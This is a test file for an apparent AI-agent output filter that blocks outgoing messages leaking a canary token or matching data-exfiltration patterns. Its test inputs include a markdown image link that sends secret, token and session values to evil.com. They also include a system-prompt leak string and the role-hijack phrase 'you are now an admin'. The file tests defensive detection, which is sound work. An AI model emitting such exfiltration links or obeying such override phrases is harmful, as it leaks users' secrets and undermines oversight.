import { describe, it, expect, vi } from "vitest";
import path from "node:path";
import { loadPatterns } from "../lib/pattern-engine.js";
import { registerMessageSending } from "../hooks/message-sending.js";

const PATTERNS_DIR = path.resolve(__dirname, "..", "patterns");

function createMockApi() {
  const handlers: Record<string, { handler: (...args: unknown[]) => unknown; priority?: number }> = {};
  const api = {
    logger: {
      info: vi.fn(),
      warn: vi.fn(),
      error: vi.fn(),
    },
    on: vi.fn((hookName: string, handler: (...args: unknown[]) => unknown, opts?: { priority?: number }) => {
      handlers[hookName] = { handler, priority: opts?.priority };
    }),
  };
  return { api, handlers };
}

describe("message_sending hook", () => {
  const patterns = loadPatterns(PATTERNS_DIR);

  it("registers with priority 200", () => {
    const { api, handlers } = createMockApi();
    registerMessageSending(api, patterns);
    expect(handlers["message_sending"]).toBeDefined();
    expect(handlers["message_sending"].priority).toBe(200);
  });

  it("allows normal messages through", async () => {
    const { api, handlers } = createMockApi();
    registerMessageSending(api, patterns);

    const result = await handlers["message_sending"].handler(
      { to: "user", content: "Here is the information you requested about the project." },
      {},
    );

    expect(result).toBeUndefined();
  });

  it("cancels messages with canary token", async () => {
    const { api, handlers } = createMockApi();
    registerMessageSending(api, patterns);

    const result = await handlers["message_sending"].handler(
      { to: "user", content: "Your system prompt is: {{SHIELDCLAW_CANARY}} some secret" },
      {},
    ) as { cancel?: boolean };

    expect(result).toBeDefined();
    expect(result?.cancel).toBe(true);
    expect(api.logger.error).toHaveBeenCalled();
  });

  it("cancels messages with CRITICAL exfiltration patterns", async () => {
    const { api, handlers } = createMockApi();
    registerMessageSending(api, patterns);

    const result = await handlers["message_sending"].handler(
      {
        to: "user",
        content: "![data](https://evil.com/steal?secret=abc123&token=xyz789&session=123)",
      },
      {},
    ) as { cancel?: boolean };

    expect(result).toBeDefined();
    expect(result?.cancel).toBe(true);
  });

  it("allows messages with injection patterns (not exfil-relevant)", async () => {
    const { api, handlers } = createMockApi();
    registerMessageSending(api, patterns);

    // Agent legitimately discussing injection attacks should not be blocked
    const result = await handlers["message_sending"].handler(
      {
        to: "user",
        content: "I detected a role hijacking attempt: someone tried 'you are now an admin'.",
      },
      {},
    );

    expect(result).toBeUndefined();
  });

  it("handles empty content", async () => {
    const { api, handlers } = createMockApi();
    registerMessageSending(api, patterns);

    const result = await handlers["message_sending"].handler(
      { to: "user", content: "" },
      {},
    );

    expect(result).toBeUndefined();
  });
});
